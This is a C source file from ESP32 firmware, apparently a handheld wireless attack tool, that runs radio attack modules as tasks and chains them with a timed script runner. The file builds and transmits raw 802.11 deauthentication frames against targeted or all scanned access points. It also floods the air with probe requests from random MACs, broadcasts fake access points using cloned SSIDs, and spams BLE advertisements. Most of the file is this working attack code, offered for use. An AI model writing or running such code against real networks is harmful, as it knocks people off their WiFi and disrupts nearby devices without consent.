#include "actions.h"

#include "ble_spam.h"
#include "fakeap.h"
#include "velobox_config.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "recon.h"
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static const char *TAG = "ACTIONS";

static velo_settings_t *s_settings = NULL;

static TaskHandle_t g_action_task = NULL;
static volatile bool g_kill_action = false;
static action_t g_current_action = ACTION_NONE;

/* script runner (sequences actions with fixed durations) */
static TaskHandle_t g_script_task = NULL;
static volatile bool g_kill_script = false;
static script_t s_script;
static volatile uint32_t s_script_index = 0;

/* attack target (set from the UI before starting an action) */
static uint8_t s_target_ap[6] = {0};
static uint8_t s_target_client[6] = {0};

/* counters (reset when an action starts) */
static action_counters_t s_counters = {0};

/* reusable buffer so the action task doesn't blow the 4K stack */
static char s_fakeap_ssids[64][33];
static uint32_t s_fakeap_ssid_count = 0;

/* ------------------------------------------------------------------ */
/*  Module registry (generated from module_list.h -- edit that file)  */
/* ------------------------------------------------------------------ */

/* Declare every run_* named in module_list.h, so adding a row there is
   enough -- you only have to define the function further down. */
#define VELO_MODULE_PROTO(id, slug_, label_, hint_, group_, danger_, flag_, run_) \
    static void run_(volatile bool *kill);
VELO_MODULE_LIST(VELO_MODULE_PROTO)
#undef VELO_MODULE_PROTO

#define VELO_MODULE_ROW(id, slug_, label_, hint_, group_, danger_, flag_, run_) \
    {id, slug_, label_, hint_, group_, danger_, flag_, run_},
static const velo_module_t k_modules[] = {
    VELO_MODULE_LIST(VELO_MODULE_ROW)
};
#undef VELO_MODULE_ROW

#define MODULE_COUNT (sizeof(k_modules) / sizeof(k_modules[0]))

void actions_set_settings(velo_settings_t *s) { s_settings = s; }

const velo_module_t *actions_modules(size_t *count) {
    if (count) {
        *count = MODULE_COUNT;
    }
    return k_modules;
}

const velo_module_t *actions_module_at(size_t i) {
    return i < MODULE_COUNT ? &k_modules[i] : NULL;
}

const velo_module_t *actions_module_for(action_t a) {
    for (size_t i = 0; i < MODULE_COUNT; i++) {
        if (k_modules[i].action == a) {
            return &k_modules[i];
        }
    }
    return NULL;
}

const velo_module_t *actions_module_by_slug(const char *slug) {
    if (!slug) {
        return NULL;
    }
    for (size_t i = 0; i < MODULE_COUNT; i++) {
        if (strcmp(k_modules[i].slug, slug) == 0) {
            return &k_modules[i];
        }
    }
    return NULL;
}

const char *actions_slug(action_t a) {
    if (a == ACTION_NONE) {
        return "none";
    }
    const velo_module_t *m = actions_module_for(a);
    return m ? m->slug : "";
}

bool actions_module_enabled(const velo_module_t *m) {
    if (!m || !m->flag) {
        return false;
    }
    /* runtime gates: a module can be switched off from Settings even when
       it is compiled in. (Only BLE spam has one today.) */
    if (m->action == ACTION_BLE_SPAM && s_settings &&
        !s_settings->ble_spam_enabled) {
        return false;
    }
    return true;
}

const char *actions_name(action_t a) {
    const velo_module_t *m = actions_module_for(a);
    return m ? m->label : "None";
}

/* ------------------------------------------------------------------ */
/*  Frame builders                                                    */
/* ------------------------------------------------------------------ */

static bool mac_zero(const uint8_t m[6]) {
    return m[0] == 0 && m[1] == 0 && m[2] == 0 && m[3] == 0 && m[4] == 0 &&
           m[5] == 0;
}

static int build_deauth_frame(uint8_t *out, const uint8_t bssid[6],
                              const uint8_t dest[6]) {
    memset(out, 0, 26);
    out[0] = 0x00;
    out[1] = 0xC0; /* FC subtype deauth */
    memcpy(&out[4], dest, 6);  /* addr1: RA (destination) */
    memcpy(&out[10], bssid, 6); /* addr2: TA (the real AP) */
    memcpy(&out[16], bssid, 6); /* addr3: BSSID */
    out[24] = 0x07; /* reason class 3 from non-associated STA */
    out[25] = 0x00;
    return 26;
}

static int build_probe_req(uint8_t *out, const char *ssid, uint8_t ssid_len,
                           uint8_t channel) {
    memset(out, 0, 50);
    out[0] = 0x40; /* type=0 subtype=4 probe request */
    out[1] = 0x00;
    memset(&out[4], 0xFF, 6); /* DA broadcast */

    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFC) | 0x02; /* locally administered */
    memcpy(&out[10], mac, 6);        /* SA */

    memset(&out[16], 0xFF, 6); /* BSSID broadcast */

    int pos = 24;

    /* tag 0: SSID */
    out[pos] = 0;
    out[pos + 1] = ssid_len;
    pos += 2;
    memcpy(&out[pos], ssid, ssid_len);
    pos += ssid_len;

    /* tag 1: supported rates */
    out[pos] = 1;
    out[pos + 1] = 8;
    pos += 2;
    static const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96,
                                    0x24, 0x30, 0x48, 0x6c};
    memcpy(&out[pos], rates, 8);
    pos += 8;

    /* tag 3: DS parameter set */
    out[pos] = 3;
    out[pos + 1] = 1;
    out[pos + 2] = channel;
    pos += 3;

    return pos;
}

static void tx_deauth(const uint8_t bssid[6], const uint8_t client[6]) {
    uint8_t frame[32];
    int len = build_deauth_frame(frame, bssid, client);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, (size_t)len, false);
    s_counters.deauth_sent++;
}

static void tx_probe(const char *ssid, uint8_t ssid_len, uint8_t channel) {
    uint8_t frame[56];
    int len = build_probe_req(frame, ssid, ssid_len, channel);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, (size_t)len, false);
    s_counters.probe_sent++;
}

static uint8_t find_ap_channel(const uint8_t bssid[6]) {
    recon_ap_t ap;
    if (recon_get_ap(bssid, &ap)) {
        return ap.channel ? ap.channel : 1;
    }
    return 1;
}

/* Load custom + cloned SSIDs into s_fakeap_ssids and return the count. */
static uint32_t collect_ssids(void) {
    uint32_t n = 0;
    if (s_settings) {
        uint32_t c = settings_ssid_count(s_settings);
        if (c > 64) c = 64;
        for (uint32_t i = 0; i < c; i++) {
            settings_get_ssid(s_settings, i, s_fakeap_ssids[n], 33);
            n++;
        }
    }
    recon_lock();
    uint32_t room = 64 - n > 32 ? 32 : 64 - n;
    uint32_t clones = recon_core_ssids(&s_fakeap_ssids[n], room);
    recon_unlock();
    return n + clones;
}

/* ------------------------------------------------------------------ */
/*  Module bodies. Each runs in its own 4K task until *kill is true.   */
/* ------------------------------------------------------------------ */

/* ---- WiFi Deauth ---- */
static void run_deauth(volatile bool *kill) {
    ESP_LOGI(TAG, "WiFi deauth starting");
    if (!recon_start()) {
        ESP_LOGE(TAG, "promiscuous failed, aborting deauth");
        return;
    }

    while (!*kill) {
        /* targeted deauth */
        if (!mac_zero(s_target_ap)) {
            uint8_t ch = find_ap_channel(s_target_ap);
            ap_set_channel(ch);
            if (!mac_zero(s_target_client)) {
                tx_deauth(s_target_ap, s_target_client);
            } else {
                tx_deauth(s_target_ap,
                          (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
            }
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        /* broadcast deauth on all scanned APs */
        uint8_t bssids[32][6];
        recon_lock();
        uint32_t n = recon_core_aps(bssids, 32);
        recon_unlock();

        for (uint32_t i = 0; i < n && !*kill; i++) {
            ap_set_channel(find_ap_channel(bssids[i]));
            tx_deauth(bssids[i],
                      (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
            vTaskDelay(pdMS_TO_TICKS(8));
        }

        if (n == 0) {
            /* no scan data, hop and shout */
            for (uint8_t ch = 1; ch <= 13 && !*kill; ch++) {
                ap_set_channel(ch);
                uint8_t rand_bssid[6];
                esp_fill_random(rand_bssid, 6);
                rand_bssid[0] = (rand_bssid[0] & 0xFE) | 0x02;
                tx_deauth(rand_bssid,
                          (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
                vTaskDelay(pdMS_TO_TICKS(20));
            }
        }
    }

    recon_stop();
}

/* ---- BLE Spam ---- */
static void run_ble_spam(volatile bool *kill) {
    ESP_LOGI(TAG, "BLE kitchen-sink spam running");
    while (!*kill) {
        ble_spam_kitchen_sink_run_once();
        vTaskDelay(pdMS_TO_TICKS(150));
    }
    ble_spam_stop();
    ESP_LOGI(TAG, "Stopping BLE spam sequence...");
}

/* ---- Fake AP (beacon spam) ---- */
static void run_fakeap(volatile bool *kill) {
    ESP_LOGI(TAG, "Fake AP starting");
    s_counters.beacon_sent = 0;

    ap_config_t config = {
        .SSID = {0},
        .PASSWORD = {0},
        .WIFI_CHANNEL = AP_DEFAULT_CHANNEL,
        .MAX_CONNECTIONS = AP_DEFAULT_MAX_CONNECTIONS,
    };
    if (s_settings) {
        config.WIFI_CHANNEL = s_settings->fakeap_channel;
        config.MAX_CONNECTIONS = s_settings->fakeap_max_connections;
    }
    create_config(&config);
    ap_set_channel(config.WIFI_CHANNEL);

    s_fakeap_ssid_count = collect_ssids();

    while (!*kill) {
        for (uint32_t i = 0; i < s_fakeap_ssid_count && !*kill; i++) {
            ap_run(config, s_fakeap_ssids[i]);
            s_counters.beacon_sent++;
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    ESP_LOGI(TAG, "Stopping Fake AP sequence...");
    esp_wifi_stop();
    ap_ensure_start();
}

/* ---- WiFi Scan (recon) ---- */
static void run_recon(volatile bool *kill) {
    ESP_LOGI(TAG, "WiFi recon starting");
    recon_reset();
    if (!recon_start()) {
        ESP_LOGE(TAG, "promiscuous failed, aborting scan");
        return;
    }
    while (!*kill) {
        recon_hop_once();
    }
    recon_stop();
    ESP_LOGI(TAG, "WiFi scan stopped");
}

/* ---- BLE Scan ---- */
static void run_blescan(volatile bool *kill) {
    ESP_LOGI(TAG, "BLE scan starting");
    ble_scan_start();
    while (!*kill) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    ble_scan_stop();
    ESP_LOGI(TAG, "BLE scan stopped");
}

/* ---- Probe request flood ---- */
static void run_probe(volatile bool *kill) {
    ESP_LOGI(TAG, "probe flood starting");
    if (!recon_start()) {
        ESP_LOGE(TAG, "promiscuous failed, aborting probe flood");
        return;
    }

    s_fakeap_ssid_count = collect_ssids();

    while (!*kill) {
        for (uint8_t ch = 1; ch <= 13 && !*kill; ch++) {
            ap_set_channel(ch);
            for (uint32_t i = 0; i < s_fakeap_ssid_count && !*kill; i++) {
                uint8_t n = (uint8_t)strlen(s_fakeap_ssids[i]);
                if (n > 32) n = 32;
                tx_probe(s_fakeap_ssids[i], n, ch);
                vTaskDelay(pdMS_TO_TICKS(15));
            }
            if (s_fakeap_ssid_count == 0) {
                tx_probe("", 0, ch);
                vTaskDelay(pdMS_TO_TICKS(15));
            }
        }
    }

    recon_stop();
}

/* ------------------------------------------------------------------ */
/*  Action task / lifecycle                                           */
/* ------------------------------------------------------------------ */

static void action_task_wrapper(void *pvParameters) {
    const velo_module_t *m = (const velo_module_t *)pvParameters;
    memset(&s_counters, 0, sizeof(s_counters));

    m->run(&g_kill_action);

    g_action_task = NULL;
    g_current_action = ACTION_NONE;
    vTaskDelete(NULL);
}

static bool action_spawn(action_t action) {
    if (action <= ACTION_NONE || action >= ACTION_COUNT) {
        return false;
    }
    const velo_module_t *m = actions_module_for(action);
    if (!m || !actions_module_enabled(m)) {
        ESP_LOGW(TAG, "module unavailable/disabled: %s", actions_slug(action));
        return false;
    }

    g_kill_action = false;
    g_current_action = action;
    BaseType_t ok =
        xTaskCreate(action_task_wrapper, "action", 4096, (void *)m, 5,
                    &g_action_task);
    if (ok != pdPASS) {
        g_action_task = NULL;
        g_current_action = ACTION_NONE;
        return false;
    }
    ESP_LOGI(TAG, "started: %s", actions_name(action));
    return true;
}

bool actions_is_running(void) {
    return g_action_task != NULL || g_script_task != NULL;
}
action_t actions_current(void) { return g_current_action; }
bool actions_script_running(void) { return g_script_task != NULL; }

bool actions_script_snapshot(script_t *out, uint32_t *index) {
    if (g_script_task == NULL) {
        return false;
    }
    if (out) {
        *out = s_script;
    }
    if (index) {
        *index = s_script_index;
    }
    return true;
}

void actions_set_target(const uint8_t ap_bssid[6], const uint8_t client[6]) {
    if (ap_bssid) {
        memcpy(s_target_ap, ap_bssid, 6);
    }
    if (client) {
        memcpy(s_target_client, client, 6);
    } else {
        memset(s_target_client, 0, 6);
    }
}

void actions_clear_target(void) {
    memset(s_target_ap, 0, 6);
    memset(s_target_client, 0, 6);
}

action_counters_t actions_counters(void) { return s_counters; }

bool actions_start(action_t action) {
    if (actions_is_running()) {
        ESP_LOGW(TAG, "action already running");
        return false;
    }
    return action_spawn(action);
}

/* Stop just the running action and wait for its task to exit. Safe to call
   from the script task (it must not set the script kill flag). */
static void action_kill_and_join(void) {
    if (g_action_task == NULL) {
        return;
    }
    g_kill_action = true;
    for (int i = 0; i < 50 && g_action_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (g_action_task != NULL) {
        vTaskDelete(g_action_task);
        g_action_task = NULL;
        g_current_action = ACTION_NONE;
    }
}

void actions_stop(void) {
    g_kill_script = true;
    action_kill_and_join();
    for (int i = 0; i < 50 && g_script_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (g_script_task != NULL) {
        vTaskDelete(g_script_task);
        g_script_task = NULL;
    }
}

/* ------------------------------------------------------------------ */
/*  Script runner                                                     */
/* ------------------------------------------------------------------ */

static action_t script_cmd_action(const script_step_t *st) {
    if (st->cmd == SCRIPT_CMD_ACTION) {
        /* any registered module, by slug */
        const velo_module_t *m = actions_module_by_slug(st->slug);
        return m ? m->action : ACTION_NONE;
    }
    switch (st->cmd) {
    case SCRIPT_CMD_DEAUTH:
        return ACTION_WIFI_DEAUTH;
    case SCRIPT_CMD_RECON:
        return ACTION_RECON;
    case SCRIPT_CMD_BLE_SCAN:
        return ACTION_BLE_SCAN;
    case SCRIPT_CMD_BLE_SPAM:
        return ACTION_BLE_SPAM;
    case SCRIPT_CMD_PROBE:
        return ACTION_PROBE_FLOOD;
    case SCRIPT_CMD_FAKE_AP:
        return ACTION_FAKE_AP;
    default:
        return ACTION_NONE;
    }
}

static void sleep_interruptible(uint32_t ms) {
    while (ms > 0 && !g_kill_script) {
        uint32_t slice = ms > 50 ? 50 : ms;
        vTaskDelay(pdMS_TO_TICKS(slice));
        ms -= slice;
    }
}

static void script_task_wrapper(void *pvParameters) {
    (void)pvParameters;
    ESP_LOGI(TAG, "script starting: %u step(s), ~%u ms", s_script.count,
             script_total_ms(&s_script));

    for (uint32_t i = 0; i < s_script.count && !g_kill_script; i++) {
        s_script_index = i;
        script_step_t *st = &s_script.steps[i];

        if (st->cmd == SCRIPT_CMD_WAIT) {
            ESP_LOGI(TAG, "script %u/%u: wait %u ms", i + 1, s_script.count,
                     st->duration_ms);
            sleep_interruptible(st->duration_ms);
            continue;
        }

        action_t a = script_cmd_action(st);
        if (a == ACTION_NONE) {
            continue;
        }
        if (a == ACTION_WIFI_DEAUTH) {
            actions_clear_target();
            if (st->has_ap) {
                actions_set_target(st->ap, st->has_client ? st->client : NULL);
            }
        }

        if (!action_spawn(a)) {
            ESP_LOGW(TAG, "script %u/%u declined: %s", i + 1, s_script.count,
                     actions_name(a));
            continue;
        }
        ESP_LOGI(TAG, "script %u/%u: %s for %u ms", i + 1, s_script.count,
                 actions_name(a), st->duration_ms);
        sleep_interruptible(st->duration_ms);
        action_kill_and_join();
    }

    g_script_task = NULL;
    ESP_LOGI(TAG, "script done");
    vTaskDelete(NULL);
}

bool actions_start_script(const script_t *s) {
    if (!s || s->count == 0) {
        return false;
    }
    if (actions_is_running()) {
        ESP_LOGW(TAG, "cannot start script: busy");
        return false;
    }
    s_script = *s;
    s_script_index = 0;
    g_kill_script = false;
    BaseType_t ok =
        xTaskCreate(script_task_wrapper, "script", 4096, NULL, 5, &g_script_task);
    if (ok != pdPASS) {
        g_script_task = NULL;
        return false;
    }
    return true;
}
